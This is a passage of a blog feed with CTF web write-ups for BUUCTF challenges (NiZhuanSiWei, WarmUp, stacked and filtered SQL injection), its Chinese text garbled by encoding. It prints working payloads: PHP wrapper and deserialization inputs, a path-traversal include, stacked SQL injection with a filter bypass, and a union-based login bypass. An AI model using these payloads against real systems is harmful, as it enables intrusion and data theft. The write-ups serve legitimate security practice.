class="keyword">echo</span>Â $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ä¾æ—§æ•°ç»„ç»•è¿‡<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]=a&amp;param2[]=b</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="./24.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>flag{b43ee0d2-4f80-4bcb-9674-7dc11e27bb3c}</p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p><a href="http://e1d2e78d-5eb7-4c10-88ca-b46fcfd7fba3.node3.buuoj.cn" target="_blank" rel="noopener">http://e1d2e78d-5eb7-4c10-88ca-b46fcfd7fba3.node3.buuoj.cn</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>Â Â </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">Â  Â  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">Â  Â  <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">exit</span>();Â </span><br><span class="line">Â  Â  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">include</span>($file);Â  <span class="comment">//useless.php</span></span><br><span class="line">Â  Â  Â  Â  $password = unserialize($password);</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">echo</span> $password;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">Â  Â  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>$texté‡Œçš„file_get_contents()å‡½æ•°ä¼šæŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­,å³éœ€è¦ä¼ å…¥ä¸€ä¸ªæ–‡ä»¶å†…å®¹ä¸ºâ€welcome to the zjctfâ€,é‡‡ç”¨phpä¼ªåè®®ä¼ è¾“<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="./25.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>$fileé‡Œå¯ä»¥includeæ–‡ä»¶,ä½†å¯¹flagåšäº†è¿‡æ»¤,åŒæ—¶æ³¨é‡Šäº†useless.php,åˆ©ç”¨phpä¼ªåè®®æŸ¥çœ‹æºä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./26.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>useless.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>Â Â </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;Â  <span class="comment">//flag.phpÂ Â </span></span><br><span class="line">Â  Â  <span class="keyword">public</span> $file;Â Â </span><br><span class="line">Â  Â  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;Â Â </span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;Â Â </span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);Â </span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">Â  Â  Â  Â  &#125;Â Â </span><br><span class="line">Â  Â  &#125;Â Â </span><br><span class="line">&#125;Â Â </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ ¹æ®index.phpé‡Œpasswordä¼šåºåˆ—åŒ–,åœ¨useless.phpé‡Œè¿›è¡Œååºåˆ—åŒ–<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;Â  <span class="comment">//flag.php</span></span><br><span class="line">Â  Â  <span class="keyword">public</span> $file=<span class="string">"flag.php"</span>;</span><br><span class="line">Â  Â  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Flag();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">O:<span class="number">4</span>:<span class="string">"Flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure></p><p>ä¸€å¹¶ä¼ å…¥,æŸ¥çœ‹æºç <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="./27.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>flag{20a27159-4eb0-48e4-af80-c437443282a8}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL&quot;&gt;&lt;a href=&quot;#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL&quot; class=&quot;headerlink&quot; title=&quot;[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL&quot;&gt;&lt;/a&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL&lt;/h2&gt;&lt;p&gt;&lt;a h
      
    
    </summary>
    
    
      <category term="ctf writeup web" scheme="https://www.damyahome.github.io/categories/ctf-writeup-web/"/>
    
    
      <category term="ä¸ªäººctfç«èµ›" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF webç»ƒä¹ 2</title>
    <link href="https://www.damyahome.github.io/BUUCTF-web%E7%BB%83%E4%B9%A02/"/>
    <id>https://www.damyahome.github.io/BUUCTF-web%E7%BB%83%E4%B9%A02/</id>
    <published>2020-09-25T13:20:04.000Z</published>
    <updated>2020-09-25T13:22:09.933Z</updated>
    
    <content type="html"><![CDATA[<p>webé¢˜è‡ªç„¶æ˜¯æƒ³mdå½¢å¼,çœ‹ç€å¥½çœ‹,å¥ˆä½•æœ¬åœ°æŠ¥é”™,pdfå‡‘åˆçœ‹å§</p><p>pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ<br><div class="row">    <embed src="BUUCTF_webç»ƒä¹ 2.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;webé¢˜è‡ªç„¶æ˜¯æƒ³mdå½¢å¼,çœ‹ç€å¥½çœ‹,å¥ˆä½•æœ¬åœ°æŠ¥é”™,pdfå‡‘åˆçœ‹å§&lt;/p&gt;
&lt;p&gt;pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;BUUCTF_webç»ƒä¹ 2.pdf&quot; width=&quot;100%&quot; height
      
    
    </summary>
    
    
      <category term="ctf writeup web" scheme="https://www.damyahome.github.io/categories/ctf-writeup-web/"/>
    
    
      <category term="ä¸ªäººctfç«èµ›" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>[MISC]æ‹¼å›¾é¢˜å°ç»“</title>
    <link href="https://www.damyahome.github.io/MISC-%E6%8B%BC%E5%9B%BE%E9%A2%98%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.damyahome.github.io/MISC-%E6%8B%BC%E5%9B%BE%E9%A2%98%E5%B0%8F%E7%BB%93/</id>
    <published>2020-09-24T13:20:28.000Z</published>
    <updated>2020-09-24T13:23:21.529Z</updated>
    
    <content type="html"><![CDATA[<p>pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ<br><div class="row">    <embed src="[MISC]æ‹¼å›¾é¢˜å°ç»“.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;[MISC]æ‹¼å›¾é¢˜å°ç»“.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;
	&lt;/div&gt;


&lt;
      
    
    </summary>
    
    
      <category term="ctf writeup misc" scheme="https://www.damyahome.github.io/categories/ctf-writeup-misc/"/>
    
    
      <category term="çŸ¥è¯†å°ç»“" scheme="https://www.damyahome.github.io/tags/%E7%9F%A5%E8%AF%86%E5%B0%8F%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>web for pentester 1 wp</title>
    <link href="https://www.damyahome.github.io/web-for-pentester-1-wp/"/>
    <id>https://www.damyahome.github.io/web-for-pentester-1-wp/</id>
    <published>2020-09-24T08:03:04.000Z</published>
    <updated>2020-09-24T08:05:32.238Z</updated>
    
    <content type="html"><![CDATA[<p>pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ<br><div class="row">    <embed src="web_for_pentester_1_wp.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;web_for_pentester_1_wp.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;

      
    
    </summary>
    
    
      <category term="ctf writeup web" scheme="https://www.damyahome.github.io/categories/ctf-writeup-web/"/>
    
    
      <category term="é¶åœºç»ƒä¹ " scheme="https://www.damyahome.github.io/tags/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF_webç»ƒä¹ 1</title>
    <link href="https://www.damyahome.github.io/BUUCTF-web%E7%BB%83%E4%B9%A01/"/>
    <id>https://www.damyahome.github.io/BUUCTF-web%E7%BB%83%E4%B9%A01/</id>
    <published>2020-09-23T13:13:38.000Z</published>
    <updated>2020-09-23T13:45:38.330Z</updated>
    
    <content type="html"><![CDATA[<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p><a href="http://b76e95a3-a2ea-4205-a05c-bde04cd66b95.node3.buuoj.cn" target="_blank" rel="noopener">http://b76e95a3-a2ea-4205-a05c-bde04cd66b95.node3.buuoj.cn</a></p><p>æŸ¥çœ‹æºç çœ‹åˆ°æç¤ºsource.php,è®¿é—®ä¹‹,å¾—åˆ°æºç ,å®¡è®¡ä¹‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Â Â Â Â highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">Â Â Â Â <span class="class"><span class="keyword">class</span>Â <span class="title">emmm</span></span></span><br><span class="line"><span class="class">Â Â Â Â </span>&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">public</span>Â <span class="keyword">static</span>Â <span class="function"><span class="keyword">function</span>Â <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">Â Â Â Â Â Â Â Â </span>&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â $whitelistÂ =Â [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">if</span>Â (!Â <span class="keyword">isset</span>($page)Â ||Â !is_string($page))Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">"youÂ can'tÂ seeÂ it"</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â <span class="keyword">false</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">if</span>Â (in_array($page,Â $whitelist))Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â <span class="keyword">true</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â &#125;</span><br><span class="line"><span class="comment">//$whitelistå˜é‡åªåŒ…å«source.phpå’Œhint.php,issetå‡½æ•°æ£€æµ‹å˜é‡æ˜¯å¦å£°æ˜,is_stringå‡½æ•°æ£€æµ‹å˜é‡æ˜¯å¦ä¸ºå­—ç¬¦ä¸²,in_arrayå‡½æ•°æ£€æµ‹æ•°ç»„ä¸­æ˜¯å¦åŒ¹é…$whitelist</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â $_pageÂ =Â mb_substr(</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â $page,</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="number">0</span>,</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â mb_strpos($pageÂ .Â <span class="string">'?'</span>,Â <span class="string">'?'</span>)</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â );</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">if</span>Â (in_array($_page,Â $whitelist))Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â <span class="keyword">true</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â &#125;</span><br><span class="line"><span class="comment">//mb_substrè¿”å›$pageå­—ç¬¦ä¸²ä»å¤´å¼€å§‹,åˆ°mb_strposæŸ¥æ‰¾?åœ¨$pageä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®çš„ä¸€æ®µé•¿åº¦çš„å­—ç¬¦,å³å¦‚æœ$pageæœ‰?,åˆ™æˆªå–?å‰çš„å­—ç¬¦ä¸²</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â $_pageÂ =Â urldecode($page);</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â $_pageÂ =Â mb_substr(</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â $_page,</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="number">0</span>,</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â mb_strpos($_pageÂ .Â <span class="string">'?'</span>,Â <span class="string">'?'</span>)</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â );</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">if</span>Â (in_array($_page,Â $whitelist))Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â <span class="keyword">true</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â &#125;</span><br><span class="line"><span class="comment">//å¯¹$pageè¿›è¡Œè§£ç ,å¹¶å†æˆªå–ä¸€é</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">"youÂ can'tÂ seeÂ it"</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â <span class="keyword">false</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â <span class="keyword">if</span>Â (!Â <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">Â Â Â Â Â Â Â Â &amp;&amp;Â is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">Â Â Â Â Â Â Â Â &amp;&amp;Â emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">Â Â Â Â )Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">include</span>Â $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">exit</span>;</span><br><span class="line"><span class="comment">//emptyæ£€æŸ¥å˜é‡fileæ˜¯å¦ä¸ºç©º,å¹¶is_stringåˆ¤æ–­æ˜¯å¦ä¸ºå­—ç¬¦ä¸²,å¹¶ä¸”è¦èƒ½è®¿é—®,æ¡ä»¶éƒ½æ»¡è¶³å°±åŒ…å«fileä¼ å…¥çš„æ–‡ä»¶è¿›è¡Œè®¿é—®</span></span><br><span class="line">Â Â Â Â &#125;Â <span class="keyword">else</span>Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">"&lt;br&gt;&lt;imgÂ src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\"Â /&gt;"</span>;</span><br><span class="line">Â Â Â Â &#125;Â Â </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®hint.phpè¯•è¯•<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?file=hint.php</span><br><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br><span class="line">/?file=hint.php?../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure></p><p>flag{3e11f910-1c51-453c-af9a-029edd269163}</p><h2 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h2><p><a href="http://d3003809-2d5c-4066-a9c6-9a706cb6e6d1.node3.buuoj.cn" target="_blank" rel="noopener">http://d3003809-2d5c-4066-a9c6-9a706cb6e6d1.node3.buuoj.cn</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=1</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./1.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?inject=1&apos; //æŠ¥é”™,å­˜åœ¨sqlæ³¨å…¥</span><br><span class="line">å°è¯•selectæç¤ºè¢«è¿‡æ»¤</span><br><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./2.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=-1&apos;;show+databases;  //å°è¯•å †å æ³¨å…¥æŸ¥çœ‹æ•°æ®åº“</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./3.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=-1&apos;;show+tables+from+supersqli;  //æŸ¥è¡¨</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./4.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=-1&apos;;show+columns+from+`1919810931114514`;  //æŸ¥åˆ—</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./5.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>å› ä¸ºshowæœ€å¤šåªèƒ½æŸ¥è¯¢åˆ°å­—æ®µå,æ— æ³•æŸ¥è¯¢å…·ä½“æ•°æ®,æ‰€ä»¥è¿˜æ˜¯éœ€è¦ç»•è¿‡è¿‡æ»¤,è¿™é‡Œç”¨çš„æ˜¯é¢„ç¼–è¯‘æ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=-1&apos;;use supersqli;set @sql=concat(&apos;s&apos;,&apos;elect `flag` from `1919810931114514`&apos;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;#</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./6.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>flag{940f9932-6f3f-4507-a641-e91163cb4e03}</p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p><a href="http://38f97425-069f-4ac7-a2de-960197db8f8b.node3.buuoj.cn" target="_blank" rel="noopener">http://38f97425-069f-4ac7-a2de-960197db8f8b.node3.buuoj.cn</a></p><p>å°è¯•è¾“å…¥1,å‘ç°æ˜¯postä¼ å‚çš„æ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">query=1</span><br><span class="line">query=1;show databases;</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./7.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=1;show tables;</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./8.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>è€Œåå‘ç°fromè¢«è¿‡æ»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=*,1  ==&gt;  select *,1 || flag from flag</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./9.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">å®˜æ–¹è§£æ³•</span><br><span class="line">1;set sql_mode=PIPES_AS_CONCAT;select 1</span><br><span class="line">æ„é€ æˆ</span><br><span class="line">select 1;set sql_mode=PIPES_AS_CONCAT;select 1 || flag FROM Flag</span><br><span class="line">å…¶ä¸­PIPES_AS_CONCATèƒ½å°†||è§†ä¸ºå­—ç¬¦ä¸²è¿æ¥ç¬¦è€Œéæˆ–è¿ç®—ç¬¦</span><br><span class="line">å®é™…è¿è¡Œä¸º</span><br><span class="line">select 1;set sql_mode=PIPES_AS_CONCAT;select &quot;1&quot;+flag from Flag</span><br></pre></td></tr></table></figure><p>flag{22da20ee-17da-4f57-8a47-643580b0d03b}</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</h2><p><a href="http://5f70d406-086d-4640-a0c5-d08988a8f729.node3.buuoj.cn" target="_blank" rel="noopener">http://5f70d406-086d-4640-a0c5-d08988a8f729.node3.buuoj.cn</a></p><figure class="image-box">                <img src="./10.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>ç›´æ¥æ‰‹æ³¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=1&apos;and+&apos;1&apos;=&apos;2&apos;+union+select+1,2,&apos;3</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./11.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>flag{9da954e2-3523-4bdb-8beb-77c5c4b905ac}</p><h2 